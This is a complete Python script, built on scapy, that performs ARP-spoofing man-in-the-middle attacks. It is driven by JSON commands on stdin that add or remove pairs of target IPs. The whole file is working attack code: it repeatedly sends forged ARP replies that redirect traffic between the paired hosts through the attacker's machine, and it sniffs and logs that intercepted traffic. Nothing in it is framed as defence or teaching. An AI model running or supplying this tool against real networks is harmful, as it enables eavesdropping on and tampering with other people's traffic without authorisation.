import sys
import json
import threading
import time
from scapy.all import IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP
from datetime import datetime

targets = []
is_running = True
lock = threading.Lock()

attacker_mac = get_if_hwaddr(conf.iface)

# Cache to store resolved IP-MAC pairs
mac_cache = {}


def log_info(msg):
    print(json.dumps({"type": "info", "info": msg}), flush=True)


def log_error(msg):
    print(json.dumps({"type": "error", "error": msg}), flush=True)


def send_packet_info(packet):
    if Ether in packet:
        src = packet[Ether].src.lower()
        dst = packet[Ether].dst.lower()
        with lock:
            for ip1, ip2 in targets:
                mac1 = mac_cache.get(ip1)
                mac2 = mac_cache.get(ip2)

                if mac1 is None or mac2 is None:
                    # Skip pairs with missing MACs
                    continue

                if (src == mac1 and dst == attacker_mac) or (src == mac2 and dst == attacker_mac) or (src == attacker_mac and dst == mac1) or (src == attacker_mac and dst == mac2):
                    info = {
                        "type": "packet",
                        "summary": packet.summary(),
                    }
                    print(json.dumps(info), flush=True)
                    break


def spoof_loop():
    while is_running:
        with lock:
            for ip1, ip2 in targets:
                spoof(ip1, ip2)
                spoof(ip2, ip1)
        time.sleep(2)


def get_mac(ip):
    """Retrieve MAC address for an IP address, using cache if available."""
    if ip not in mac_cache:
        # Resolve MAC address if not cached
        mac = getmacbyip(ip).lower()
        if mac:
            mac_cache[ip] = mac
        else:
            log_error(f"Failed to resolve MAC address for IP: {ip}")
            return None
    return mac_cache[ip]


def spoof(ip1, ip2):
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)

    if mac1 is None or mac2 is None:
        log_error(f"Failed to resolve MAC address for IPs: {ip1} or {ip2}")
        return

    # Create the ARP spoof packet
    packet = ARP(op=2, pdst=ip1, psrc=ip2, hwsrc=attacker_mac, hwdst=mac1)

    # Send the spoofed packet
    send(packet, verbose=False)

    # Also spoof in the opposite direction
    packet = ARP(op=2, pdst=ip2, psrc=ip1, hwsrc=attacker_mac, hwdst=mac2)
    send(packet, verbose=False)


def sniff_thread():
    sniff(prn=send_packet_info, store=0)


def handle_command(command):
    global is_running
    try:
        data = json.loads(command)
        action = data.get("action")

        if action == "add_target":
            ip1, ip2 = data["ip1"], data["ip2"]
            with lock:
                if (ip1, ip2) not in targets:
                    targets.append((ip1, ip2))
                    log_info(f"Added spoofing pair: {ip1} <-> {ip2}")

        elif action == "remove_target":
            ip1, ip2 = data["ip1"], data["ip2"]
            with lock:
                if (ip1, ip2) in targets:
                    targets.remove((ip1, ip2))
                    log_info(f"Removed spoofing pair: {ip1} <-> {ip2}")

        elif action == "shutdown":
            is_running = False
            log_info("Shutting down spoofer...")

    except Exception as e:
        log_error(f"Failed to handle command: {str(e)}")


def main():
    log_info("Spoofer started.")

    threading.Thread(target=spoof_loop, daemon=True).start()
    threading.Thread(target=sniff_thread, daemon=True).start()

    for line in sys.stdin:
        handle_command(line.strip())
        if not is_running:
            break

    log_info("Spoofer exited.")


if __name__ == "__main__":
    main()
